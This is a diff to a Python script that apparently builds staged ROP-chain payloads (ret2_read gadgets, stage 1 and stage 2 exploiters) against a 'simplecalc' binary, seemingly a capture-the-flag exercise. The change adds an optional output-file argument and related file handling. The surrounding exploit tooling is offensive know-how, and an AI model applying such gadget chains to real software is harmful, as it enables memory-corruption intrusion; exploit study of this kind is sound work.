@@ -4,6 +4,7 @@ from exploiterRaw import exploiterRaw
 from metaGadget import *
 import argparse
 import brainfuck
+import os.path
 
 EXEC_PATH = './simplecalc'
 
@@ -13,10 +14,21 @@ my_parser.add_argument('Input',
                        metavar='input',
                        type=str,
                        help='the path to the source code file')
+                       
+my_parser.add_argument('-o', '--output',
+                       metavar='output',
+                       required=False,
+                       type=str,
+                       help='the path of the compiled binary output')
 
 args = my_parser.parse_args()
-input_path = args.Input
+args_dict = vars(args)
 
+input_path = args.Input
+output_path = ''
+
+if args_dict['output']:
+    output_path = args_dict['output']
 
 class compiler:
     DATA_SIZE = 3
@@ -92,12 +104,25 @@ pre.start()
 bf.init()
 '''
 
+
+def initialize_output_file(output_path):
+    if os.path.isfile(output_path):
+        try:
+            open(output_path, 'w').close()
+        except IOError:
+            print('Failure')
+
+
+if output_path != '':
+    initialize_output_file(output_path)
+
 repository_start= 0x00000000006C1060
 repository_end = 0x00000000006C5190
 
 repository_size = repository_end - repository_start
 
 stage1Exploiter = exploiter()
+stage1Exploiter.set_output_file(output_path)
 gen1 = metaGadetGenerator(stage1Exploiter)
 
 gen1.ret2_read(0, repository_start, repository_size)
@@ -107,7 +132,9 @@ gen1.finalize()
 # Stage 2
 
 stage2Exploiter = exploiterRaw()
+stage2Exploiter.set_output_file(output_path)
 gen2 = metaGadetGenerator(stage2Exploiter)
 
+gen2.marker()
 gen2.marker()
 gen2.finalize()
